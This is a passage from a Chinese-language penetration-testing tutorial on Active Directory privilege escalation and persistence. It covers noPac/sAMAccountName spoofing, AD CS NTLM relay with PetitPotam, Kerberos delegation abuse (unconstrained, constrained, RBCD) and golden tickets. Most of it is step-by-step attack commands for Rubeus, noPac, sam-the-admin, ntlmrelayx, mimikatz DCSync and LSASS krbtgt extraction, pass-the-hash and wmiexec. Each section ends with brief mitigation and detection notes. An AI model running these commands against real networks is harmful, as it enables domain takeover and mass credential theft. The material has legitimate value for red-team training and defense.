<li>清除该账户的SPN（服务主体名称），避免冲突：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-DomainObject</span> <span class="literal">-Clear</span> <span class="string">&#x27;serviceprincipalname&#x27;</span></span><br></pre></td></tr></table></figure></li>
<li>修改<code>sAMAccountName</code>为域控名称（如<code>DC</code>，不带<code>$</code>）：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-MachineAccountAttribute</span> <span class="literal">-MachineAccount</span> AttackerMachine <span class="literal">-Value</span> <span class="string">&quot;DC&quot;</span> <span class="literal">-Attribute</span> samaccountname</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>请求伪造的TGT票据</strong>  </p>
<ul>
<li>使用<code>Rubeus</code>工具请求TGT：<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:DC /password:P@ssw0rd! /domain:example.com /dc:dc.example.com /nowrap</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>恢复机器账户名称</strong>  </p>
<ul>
<li>将<code>sAMAccountName</code>改回原始值，避免后续冲突：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-MachineAccountAttribute</span> <span class="literal">-MachineAccount</span> AttackerMachine <span class="literal">-Value</span> <span class="string">&quot;AttackerMachine&quot;</span> <span class="literal">-Attribute</span> samaccountname</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>通过S4U2Self请求高权限ST</strong>  </p>
<ul>
<li>利用TGT申请域控服务（如<code>CIFS</code>或<code>LDAP</code>）的ST，并加载到内存：<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:ldap/dc.example.com /ticket:[TGT_BASE64] /ptt</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>权限验证与利用</strong>  </p>
<ul>
<li>使用<code>dir \\dc\C$</code>验证文件访问权限。</li>
<li>通过<code>DCSync</code>导出域哈希：<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:example.com /user:krbtgt&quot;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h4 id="自动化工具利用（以noPac为例）"><a href="#自动化工具利用（以noPac为例）" class="headerlink" title="自动化工具利用（以noPac为例）"></a><strong>自动化工具利用（以noPac为例）</strong></h4><ol>
<li><p><strong>漏洞检测</strong>  </p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">noPac.exe scan -domain example.com -user lowpriv -pass &#x27;Password123!&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>一键化提权</strong>  </p>
<ul>
<li>获取CIFS服务权限：<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">noPac.exe -domain example.com -user lowpriv -pass &#x27;Password123!&#x27; /dc dc.example.com /mAccount test /mPassword test123 /service cifs /ptt</span><br></pre></td></tr></table></figure></li>
<li>获取LDAP服务权限并导出域哈希：<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">noPac.exe -domain example.com -user lowpriv -pass &#x27;Password123!&#x27; /dc dc.example.com /mAccount test /mPassword test123 /service ldap /ptt /impersonate Administrator</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<hr>
<h4 id="自动化工具利用-sam-the-admin"><a href="#自动化工具利用-sam-the-admin" class="headerlink" title="自动化工具利用(sam-the-admin)"></a><strong>自动化工具利用(sam-the-admin)</strong></h4><h5 id="步骤-1：漏洞检测与初始化"><a href="#步骤-1：漏洞检测与初始化" class="headerlink" title="步骤 1：漏洞检测与初始化"></a><strong>步骤 1：漏洞检测与初始化</strong></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sam_the_admin.py &quot;域名/普通用户:密码&quot; -dc-ip 域控IP -shell</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250426195409423.png?x-oss-process=style/img-to-webp" alt="image-20250426195409423"></p>
<ul>
<li><strong>功能</strong>：验证目标域控是否存在漏洞，并自动创建伪造的机器账户。</li>
<li><strong>关键操作</strong>：<ul>
<li>创建机器账户（如 <code>testpc</code>），清除其 SPN 属性。</li>
<li>修改机器账户的 <code>sAMAccountName</code> 为域控名称（如 <code>DC</code>，不带 <code>$</code> 后缀）。</li>
</ul>
</li>
</ul>
<h5 id="步骤-2：请求伪造-TGT-票据"><a href="#步骤-2：请求伪造-TGT-票据" class="headerlink" title="步骤 2：请求伪造 TGT 票据"></a><strong>步骤 2：请求伪造 TGT 票据</strong></h5><p>工具内部调用 <strong>Impacket</strong> 的 <code>asktgt</code> 模块，生成包含伪造 PAC 的 TGT：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asktgt -dc-ip 域控IP 域名/伪造机器账户名</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>原理</strong>：利用 KDC 对机器账户名自动添加 <code>$</code> 的缺陷，使 TGT 被误认为域控账户签发。</li>
</ul>
<h5 id="步骤-3：恢复机器账户名"><a href="#步骤-3：恢复机器账户名" class="headerlink" title="步骤 3：恢复机器账户名"></a><strong>步骤 3：恢复机器账户名</strong></h5><p>为防止命名冲突，工具自动将伪造的 <code>sAMAccountName</code> 恢复为原始值，确保后续操作不触发异常。</p>
<h5 id="步骤-4：通过-S4U2Self-请求高权限-ST"><a href="#步骤-4：通过-S4U2Self-请求高权限-ST" class="headerlink" title="步骤 4：通过 S4U2Self 请求高权限 ST"></a><strong>步骤 4：通过 S4U2Self 请求高权限 ST</strong></h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KRB5CCNAME=<span class="string">&#x27;票据缓存路径&#x27;</span> impacket-smbexec -k -no-pass 域名/域控主机名</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>功能</strong>：利用生成的 TGT，请求域控服务（如 <code>CIFS</code> 或 <code>LDAP</code>）的 ST，并注入内存。</li>
<li><strong>权限提升</strong>：通过模拟域管理员（如 <code>Administrator</code>）获取服务票据，绕过权限校验。</li>
</ul>
<h5 id="步骤-5：执行远程命令或-DCSync"><a href="#步骤-5：执行远程命令或-DCSync" class="headerlink" title="步骤 5：执行远程命令或 DCSync"></a><strong>步骤 5：执行远程命令或 DCSync</strong></h5><ul>
<li><p><strong>获取 Shell</strong>：通过 <code>smbexec.py</code> 建立交互式会话，执行系统命令。</p>
</li>
<li><p><strong>导出域哈希</strong>：调用 <code>secretsdump.py</code> 进行 DCSync，提取域内所有用户凭据：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py -k -no-pass 域名/域控主机名@域控IP</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="防御与缓解措施-3"><a href="#防御与缓解措施-3" class="headerlink" title="防御与缓解措施"></a><strong>防御与缓解措施</strong></h3><ol>
<li><strong>补丁修复</strong>：<br>安装微软补丁<strong>KB5008602</strong>和<strong>KB5008380</strong>，并重启域控。</li>
<li><strong>权限控制</strong>：  <ul>
<li>将域内<code>MachineAccountQuota</code>设置为<strong>0</strong>，禁用普通用户创建机器账户的权限。</li>
<li>限制用户对<code>sAMAccountName</code>属性的修改权限。</li>
</ul>
</li>
<li><strong>监控与检测</strong>：  <ul>
<li>监控异常<code>sAMAccountName</code>修改事件（如Event ID 5136）。</li>
<li>分析Kerberos请求中的异常S4U2Self操作。</li>
</ul>
</li>
</ol>
<hr>
<h4 id="工具与资源-1"><a href="#工具与资源-1" class="headerlink" title="工具与资源"></a><strong>工具与资源</strong></h4><ul>
<li><strong>利用工具</strong>：  <ul>
<li><a target="_blank" rel="noopener" href="https://github.com/cube0x0/noPac">noPac</a>：自动化扫描与利用工具（需.NET 4.0）。</li>
<li><a target="_blank" rel="noopener" href="https://github.com/WazeHell/sam-the-admin">sam-the-admin</a>：Python版漏洞利用脚本。</li>
</ul>
</li>
<li><strong>检测脚本</strong>：<br>使用PowerShell模块（如<code>Powerview</code>）检查域内<code>MachineAccountQuota</code>配置。</li>
</ul>
<h2 id="5-ADCS证书服务攻击（NTLM中继）"><a href="#5-ADCS证书服务攻击（NTLM中继）" class="headerlink" title="5.ADCS证书服务攻击（NTLM中继）"></a>5.ADCS证书服务攻击（NTLM中继）</h2><h3 id="一、漏洞原理"><a href="#一、漏洞原理" class="headerlink" title="一、漏洞原理"></a><strong>一、漏洞原理</strong></h3><p>Active Directory证书服务（AD CS）的HTTP证书接口未启用NTLM中继保护，且仅允许NTLM身份验证（禁用Kerberos），导致攻击者可通过NTLM Relay攻击伪造域控制器机器账户（DC$）的认证请求，获取高权限证书，进而实现权限提升或域控接管。</p>
<hr>
<h3 id="二、利用条件"><a href="#二、利用条件" class="headerlink" title="二、利用条件"></a><strong>二、利用条件</strong></h3><ol>
<li><p><strong>目标环境要求</strong>：</p>
<ul>
<li><strong>AD CS服务配置</strong>：AD CS已启用Web注册功能（HTTP接口<code>/certsrv/certfnsh.asp</code>开放），且未安装补丁KB5008602&#x2F;KB5008380。</li>
<li><strong>域控状态</strong>：域控制器未启用SMB签名或NTLM中继保护机制，且WebClient服务可能需运行（若使用ADCSPwn工具）。</li>
<li><strong>网络访问</strong>：攻击者需能访问域控的88（Kerberos）和445（SMB）端口，并具备中继到AD CS HTTP接口的能力。</li>
</ul>
</li>
<li><p><strong>攻击前提</strong>：</p>
<ul>
<li><strong>初始权限</strong>：普通域用户账号（或机器账号）凭据（密码或Hash），或无需凭证（若利用PetitPotam触发匿名认证）。</li>
<li><strong>工具依赖</strong>：需使用特定版本的Impacket（支持<code>--adcs</code>参数）及PetitPotam等工具。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="三、利用流程"><a href="#三、利用流程" class="headerlink" title="三、利用流程"></a><strong>三、利用流程</strong></h3><h4 id="1-环境准备与检测"><a href="#1-环境准备与检测" class="headerlink" title="1. 环境准备与检测"></a><strong>1. 环境准备与检测</strong></h4><ul>
<li><strong>定位证书服务器</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -config - -ping  <span class="comment"># 查询域内证书服务器地址</span></span><br></pre></td></tr></table></figure></li>
<li><strong>验证漏洞存在</strong>：访问<code>http://&lt;域控IP&gt;/certsrv/certfnsh.asp</code>，确认仅支持NTLM认证。</li>
</ul>
<h5 id="2-配置NTLM中继"><a href="#2-配置NTLM中继" class="headerlink" title="2. 配置NTLM中继"></a><strong>2. 配置NTLM中继</strong></h5><p>使用Impacket的<code>ntlmrelayx.py</code>监听并中继流量至AD CS接口：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ntlmrelayx.py -t http://&lt;CA_IP&gt;/certsrv/certfnsh.asp -smb2support --adcs --template DomainController</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>关键参数</strong>：<code>--adcs</code>指定AD CS攻击模式，<code>--template DomainController</code>请求域控证书模板。</li>
</ul>
<h4 id="3-触发NTLM认证"><a href="#3-触发NTLM认证" class="headerlink" title="3. 触发NTLM认证"></a><strong>3. 触发NTLM认证</strong></h4><p>通过PetitPotam强制域控（DC$）向中继服务器认证：</p>
<ul>
<li><strong>Python脚本</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 PetitPotam.py -d &lt;域名&gt; -u &lt;用户&gt; -p &lt;密码&gt; &lt;中继服务器IP&gt; &lt;域控IP&gt;</span><br></pre></td></tr></table></figure></li>
<li><strong>二进制工具</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PetitPotam.exe &lt;中继服务器IP&gt; &lt;域控IP&gt;  <span class="comment"># 无需凭证触发认证</span></span><br></pre></td></tr></table></figure></li>
<li><strong>Mimikatz模块</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">misc::efs /server:&lt;域控主机名&gt; /connect:&lt;中继服务器IP&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="4-获取伪造证书"><a href="#4-获取伪造证书" class="headerlink" title="4. 获取伪造证书"></a><strong>4. 获取伪造证书</strong></h4><p>成功中继后，<code>ntlmrelayx</code>会生成Base64编码的证书数据。攻击者可截获该证书，保存为文件或直接复制。</p>
<h4 id="5-申请高权限票据"><a href="#5-申请高权限票据" class="headerlink" title="5. 申请高权限票据"></a><strong>5. 申请高权限票据</strong></h4><p>使用Rubeus将证书转换为Kerberos TGT票据：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:DC$ /certificate:&lt;Base64证书&gt; /ptt</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>效果</strong>：票据注入当前会话后，攻击者具备DC$权限，可执行DCSync操作。</li>
</ul>
<h4 id="6-权限提升与横向移动"><a href="#6-权限提升与横向移动" class="headerlink" title="6. 权限提升与横向移动"></a><strong>6. 权限提升与横向移动</strong></h4><ul>
<li><strong>导出域哈希</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;lsadump::dcsync /domain:&lt;域名&gt; /user:krbtgt&quot;</span></span><br></pre></td></tr></table></figure></li>
<li><strong>哈希传递（PTH）</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:Administrator /domain:&lt;域名&gt; /ntlm:&lt;NTLM哈希&gt;</span><br></pre></td></tr></table></figure></li>
<li><strong>远程命令执行</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 wmiexec.py -hashes :&lt;NTLM哈希&gt; Administrator@&lt;域控IP&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="四、防御与缓解措施"><a href="#四、防御与缓解措施" class="headerlink" title="四、防御与缓解措施"></a><strong>四、防御与缓解措施</strong></h3><ol>
<li><p><strong>补丁与配置</strong>：</p>
<ul>
<li>安装微软补丁KB5008602，禁用HTTP证书注册接口的NTLM认证。</li>
<li>启用SMB签名及LDAPS（SSL加密）。</li>
</ul>
</li>
<li><p><strong>服务管理</strong>：</p>
<ul>
<li>停止并禁用非必要的WebClient服务（若使用ADCSPwn攻击需此服务）。</li>
<li>限制普通用户创建机器账户的权限（设置<code>MachineAccountQuota=0</code>）。</li>
</ul>
</li>
<li><p><strong>监控与检测</strong>：</p>
<ul>
<li>监控事件日志（如Event ID 4741、4768）中的异常机器账户操作或Kerberos票据请求。</li>
<li>使用PSPKIAudit脚本检测AD CS配置风险。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="五、工具与资源"><a href="#五、工具与资源" class="headerlink" title="五、工具与资源"></a><strong>五、工具与资源</strong></h3><ul>
<li><strong>攻击工具</strong>：<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/ExAndroidDev/impacket/tree/ntlmrelayx-adcs-attack">Impacket（ntlmrelayx分支）</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/topotam/PetitPotam">PetitPotam</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/bats3c/ADCSPwn">ADCSPwn</a>（内存加载利用）。</li>
</ul>
</li>
<li><strong>检测脚本</strong>：<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/GhostPack/PSPKIAudit">PSPKIAudit</a>：检查AD CS配置漏洞。</li>
</ul>
</li>
</ul>
<h1 id="八、域权限提升-委派"><a href="#八、域权限提升-委派" class="headerlink" title="八、域权限提升-委派"></a>八、域权限提升-委派</h1><hr>
<h2 id="一、委派提权的核心机制"><a href="#一、委派提权的核心机制" class="headerlink" title="一、委派提权的核心机制"></a><strong>一、委派提权的核心机制</strong></h2><p><strong>Kerberos委派（Delegation）</strong> 是Active Directory中允许<strong>服务A</strong>以用户身份访问<strong>服务B</strong>的机制，旨在实现跨服务身份传递。其本质是<strong>信任链的扩展</strong>，但配置不当会导致攻击者通过滥用委派权限，将低权限提升至域管理员甚至域控权限。核心流程如下：</p>
<hr>
<h2 id="二、委派类型与攻击面"><a href="#二、委派类型与攻击面" class="headerlink" title="二、委派类型与攻击面"></a><strong>二、委派类型与攻击面</strong></h2><h3 id="1-非约束委派（Unconstrained-Delegation）"><a href="#1-非约束委派（Unconstrained-Delegation）" class="headerlink" title="1. 非约束委派（Unconstrained Delegation）"></a><strong>1. 非约束委派（Unconstrained Delegation）</strong></h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250428005221916.png?x-oss-process=style/img-to-webp" alt="image-20250428005221916"></p>
<ul>
<li><p><strong>原理</strong>：<br>服务账户被配置为可<strong>接收任何用户的TGT</strong>（票据授予票据），并允许将其转发到任意其他服务。  </p>
<ul>
<li><strong>漏洞触发条件</strong>：<br>服务账户启用<code>TrustedForDelegation</code>属性，且攻击者控制该服务账户（或诱导高权限用户访问该服务）。</li>
<li><strong>攻击流程</strong>：  <ol>
<li><strong>获取服务账户权限</strong>：通过漏洞（如弱口令、SPN劫持）控制配置了非约束委派的服务账户（如IIS、MSSQL服务账号）。  </li>
<li><strong>诱导高权限用户访问</strong>：通过钓鱼、PetitPotam等工具强制域管理员访问该服务。  </li>
<li><strong>窃取TGT</strong>：服务账户内存中缓存用户TGT，使用Mimikatz或Rubeus导出：  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="string">&quot;sekurlsa::tickets /export&quot;</span>  <span class="comment"># 导出内存中的Kerberos票据</span></span><br></pre></td></tr></table></figure></li>
<li><strong>横向移动</strong>：利用窃取的TGT申请其他服务（如LDAP、CIFS）的ST（服务票据），执行DCSync或远程命令。</li>
</ol>
</li>
</ul>
</li>
</ul>
<h3 id="2-约束委派（Constrained-Delegation）"><a href="#2-约束委派（Constrained-Delegation）" class="headerlink" title="2. 约束委派（Constrained Delegation）"></a><strong>2. 约束委派（Constrained Delegation）</strong></h3><ul>
<li><p><strong>原理</strong>：<br>服务账户被限制只能代表用户访问<strong>特定服务</strong>（如CIFS或LDAP），通过<strong>S4U2Self</strong>和<strong>S4U2Proxy</strong>扩展实现。  </p>
<ul>
<li><strong>漏洞触发条件</strong>：<br>服务账户配置了<code>msDS-AllowedToDelegateTo</code>属性（允许委派的目标服务列表），且攻击者控制该账户。</li>
<li><strong>攻击流程</strong>：  <ol>
<li><strong>控制服务账户</strong>：获取约束委派服务账户的凭据（如Hash或密码）。  </li>
<li><strong>伪造S4U请求</strong>：  <ul>
<li><strong>S4U2Self</strong>：为任意用户申请针对自身服务的ST（无需用户密码）。  </li>
<li><strong>S4U2Proxy</strong>：将ST转发到允许委派的目标服务（如域控的LDAP）。  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /user:ServiceAccount /rc4:&lt;NTLM-Hash&gt; /impersonateuser:Administrator /msdsspn:ldap/DC01 /ptt</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>权限提升</strong>：注入ST后，以管理员身份访问域控服务（如DCSync导出哈希）。</li>
</ol>
</li>
</ul>
</li>
</ul>
<h3 id="3-基于资源的约束委派（Resource-Based-Constrained-Delegation-RBCD）"><a href="#3-基于资源的约束委派（Resource-Based-Constrained-Delegation-RBCD）" class="headerlink" title="3. 基于资源的约束委派（Resource-Based Constrained Delegation, RBCD）"></a><strong>3. 基于资源的约束委派（Resource-Based Constrained Delegation, RBCD）</strong></h3><ul>
<li><p><strong>原理</strong>：<br>由<strong>资源服务</strong>（如域控）自主定义哪些账户可委派到自身（通过<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性）。  <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250428002304219.png?x-oss-process=style/img-to-webp" alt="image-20250428002304219"></p>
<ul>
<li><p><strong>漏洞触发条件</strong>：<br>攻击者拥有对某资源的<code>Write权限</code>（如通过ACL漏洞修改目标机器的RBCD配置）。  </p>
</li>
<li><p><strong>攻击流程</strong>：  </p>
<ol>
<li><p><strong>创建恶意机器账户</strong>：利用<code>MachineAccountQuota</code>（默认允许普通用户创建10个机器账户）。  </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-MachineAccount</span> <span class="literal">-MachineAccount</span> Attacker <span class="literal">-Password</span> <span class="string">&#x27;Passw0rd!&#x27;</span></span><br></pre></td></tr></table></figure></li>
<li><p><strong>配置RBCD权限</strong>：将恶意机器账户添加到目标域控的<code>msDS-AllowedToAct...</code>属性。  </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ADComputer</span> DC01 <span class="literal">-PrincipalsAllowedToDelegateToAccount</span> Attacker<span class="variable">$</span></span><br></pre></td></tr></table></figure></li>
<li><p><strong>发起S4U攻击</strong>：利用恶意账户申请域控服务的ST，获取管理员权限。  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /user:Attacker$ /rc4:&lt;机器账户Hash&gt; /impersonateuser:Administrator /msdsspn:cifs/DC01 /ptt</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ul>
</li>
</ul>
<hr>
<h2 id="三、攻击工具与检测"><a href="#三、攻击工具与检测" class="headerlink" title="三、攻击工具与检测"></a><strong>三、攻击工具与检测</strong></h2><h3 id="1-常用工具"><a href="#1-常用工具" class="headerlink" title="1. 常用工具"></a><strong>1. 常用工具</strong></h3><ul>
<li><p><strong>信息收集</strong>：  </p>
<ul>
<li>PowerView：枚举域内委派配置。  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-DomainComputer</span> <span class="literal">-Unconstrained</span> | <span class="built_in">Select-Object</span> Name  <span class="comment"># 非约束委派主机</span></span><br><span class="line"><span class="built_in">Get-DomainUser</span> <span class="literal">-TrustedToAuth</span> | <span class="built_in">Select-Object</span> UserPrincipalName  <span class="comment"># 约束委派账户</span></span><br></pre></td></tr></table></figure></li>
<li>ADExplorer：可视化查看RBCD配置。</li>
</ul>
</li>
<li><p><strong>攻击利用</strong>：  </p>
<ul>
<li><strong>Impacket</strong>：<code>getST.py</code>生成伪造服务票据。  </li>
<li><strong>Rubeus</strong>：自动化S4U请求与票据注入。  </li>
<li><strong>Mimikatz</strong>：导出内存票据或Pass-the-Ticket攻击。</li>
</ul>
</li>
</ul>
<h3 id="2-防御与检测"><a href="#2-防御与检测" class="headerlink" title="2. 防御与检测"></a><strong>2. 防御与检测</strong></h3><ul>
<li><strong>加固措施</strong>：  <ol>
<li>禁用非必要的非约束委派配置，限制约束委派范围。  </li>
<li>设置<code>MachineAccountQuota=0</code>，防止普通用户创建机器账户。  </li>
<li>启用Kerberos Armoring（FAST）和SMB签名，防御中继攻击。</li>
</ol>
</li>
<li><strong>监控日志</strong>：  <ul>
<li>Event ID 4769（Kerberos服务票据请求）：关注异常<code>ServiceName</code>（如非标准SPN）。  </li>
<li>Event ID 5136（目录服务对象修改）：监控<code>msDS-AllowedToAct...</code>属性变更。</li>
</ul>
</li>
</ul>
<hr>
<h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a><strong>四、总结</strong></h2><p>委派提权的核心在于<strong>滥用Kerberos协议的信任链扩展机制</strong>，通过控制服务账户或修改资源权限，实现从低权限到域控权限的跃迁。防御需结合最小权限原则、日志监控与定期ACL审计，阻断攻击者从委派配置到横向移动的完整路径。</p>
<h1 id="九、域权限维持"><a href="#九、域权限维持" class="headerlink" title="九、域权限维持"></a>九、域权限维持</h1><h2 id="1-黄金票据（Golden-Ticket）"><a href="#1-黄金票据（Golden-Ticket）" class="headerlink" title="1.黄金票据（Golden Ticket）"></a>1.黄金票据（Golden Ticket）</h2><hr>
<h3 id="一、黄金票据的核心原理"><a href="#一、黄金票据的核心原理" class="headerlink" title="一、黄金票据的核心原理"></a><strong>一、黄金票据的核心原理</strong></h3><p><strong>黄金票据（Golden Ticket）</strong> 是一种基于 Kerberos 协议的身份伪造攻击，通过窃取域控中 <code>krbtgt</code> 账户的 <strong>NTLM Hash</strong> 或 <strong>AES Key</strong>，伪造任意用户的 <strong>TGT（票据授予票据）</strong>，绕过身份验证，实现持久的域管理员权限。其核心逻辑如下：  </p>
<ol>
<li><strong>TGT 的生成机制</strong>：<br>Kerberos 协议中，KDC（密钥分发中心）使用 <code>krbtgt</code> 账户的密钥加密 TGT。攻击者获取该密钥后，可自主生成 TGT，无需与 KDC 交互。  </li>
<li><strong>绕过密码验证</strong>：<br>黄金票据直接使用 <code>krbtgt</code> 的密钥加密伪造的 TGT，KDC 无法区分其合法性，默认信任该票据。  </li>
<li><strong>持久性</strong>：<br>黄金票据的有效期由攻击者自定义（默认10年），且即使域用户密码被修改或账户被禁用，票据仍有效。</li>
</ol>
<hr>
<h3 id="二、攻击前提条件"><a href="#二、攻击前提条件" class="headerlink" title="二、攻击前提条件"></a><strong>二、攻击前提条件</strong></h3><ol>
<li><strong>关键凭据</strong>：  <ul>
<li><strong><code>krbtgt</code> 账户的 NTLM Hash 或 AES Key</strong>（通常通过 DCSync 或域控内存提取）。  </li>
<li><strong>域 SID（Security Identifier）</strong>：用于构造用户&#x2F;组身份信息（如 <code>S-1-5-21-&lt;域标识&gt;-500</code> 对应 Administrator）。</li>
</ul>
</li>
<li><strong>环境要求</strong>：  <ul>
<li>攻击者已控制域内一台主机，并能够与域控通信（88&#x2F;Kerberos 端口）。  </li>
<li>未启用高级安全机制（如 <strong>Kerberos Armoring</strong> 或 <strong>FAST</strong>）。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="三、黄金票据生成与利用流程"><a href="#三、黄金票据生成与利用流程" class="headerlink" title="三、黄金票据生成与利用流程"></a><strong>三、黄金票据生成与利用流程</strong></h3><h4 id="步骤-1：获取-krbtgt-账户的凭据"><a href="#步骤-1：获取-krbtgt-账户的凭据" class="headerlink" title="步骤 1：获取 krbtgt 账户的凭据"></a><strong>步骤 1：获取 <code>krbtgt</code> 账户的凭据</strong></h4><ul>
<li><p><strong>DCSync 攻击</strong>：<br>使用 Mimikatz 或 Impacket 的 <code>secretsdump.py</code> 导出 <code>krbtgt</code> 的 Hash：  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="string">&quot;lsadump::dcsync /domain:example.com /user:krbtgt&quot;</span></span><br><span class="line"><span class="comment"># 或使用 Impacket</span></span><br><span class="line">secretsdump.py example.com/attacker@dc.example.com -just-dc-user krbtgt</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>内存提取</strong>：<br>若已获取域控权限，直接从 LSASS 进程中提取：  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::krbtgt&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="步骤-2：生成黄金票据"><a href="#步骤-2：生成黄金票据" class="headerlink" title="步骤 2：生成黄金票据"></a><strong>步骤 2：生成黄金票据</strong></h4><p>使用 <strong>Mimikatz</strong> 或 <strong>Rubeus</strong> 生成伪造的 TGT：  </p>
